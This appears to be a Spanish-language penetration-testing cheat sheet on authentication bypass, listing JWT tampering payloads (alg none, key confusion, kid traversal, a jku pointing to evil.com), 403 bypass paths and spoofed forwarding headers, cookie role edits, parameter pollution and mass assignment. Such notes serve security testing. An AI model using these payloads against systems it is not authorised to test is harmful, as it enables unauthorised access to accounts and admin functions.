# Auth Bypass Patterns

## Objetivo
Identificar cómo saltarse controles de autenticación o autorización sin credenciales válidas o con credenciales insuficientes.

## Patrones comunes

### 1. Acceso sin token
```
- Eliminar cabecera Authorization completamente
- Enviar token vacío: Authorization: Bearer ""
- Enviar token inválido: Authorization: Bearer aaa
- Cambiar token expirado y verificar si aún funciona
```

### 2. JWT manipulation
```
# Cambiar alg a none
{"alg":"none","typ":"JWT"}

# Cambiar alg de RS256 a HS256
# El servidor usa la clave pública como secret HMAC

# Modificar payload sin verificación
{"user_id": 1, "role": "admin"}

# kid injection: apuntar kid a fichero controlable
{"kid": "../../dev/null"}

# jku/x5u injection: apuntar a tu propio JWKS
{"jku": "https://evil.com/jwks.json"}
```

### 3. Bypass de 403 / panel admin
```bash
# Path traversal en URL
/admin → /%2fadmin
/admin → /admin/
/admin → /./admin
/admin → //admin

# Headers de proxy/forwarding
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1
X-Originating-IP: 127.0.0.1

# Cambio de método HTTP
GET /admin → POST /admin
GET /admin → HEAD /admin
```

### 4. Cookie manipulation
```
- Cambiar `role=user` a `role=admin` en cookie
- Modificar `is_admin=false` a `is_admin=true`
- Decodificar cookie base64, modificar y recodificar
- Eliminar cookie de sesión y ver si accede igual
```

### 5. Parameter pollution
```
?user_id=1&user_id=2   ← ¿cuál usa el servidor?
?admin=false&admin=true
```

### 6. Mass assignment
```json
# En registro o actualización de perfil, añadir campos extra
{"username": "ari", "email": "ari@test.com", "role": "admin", "is_verified": true}
```
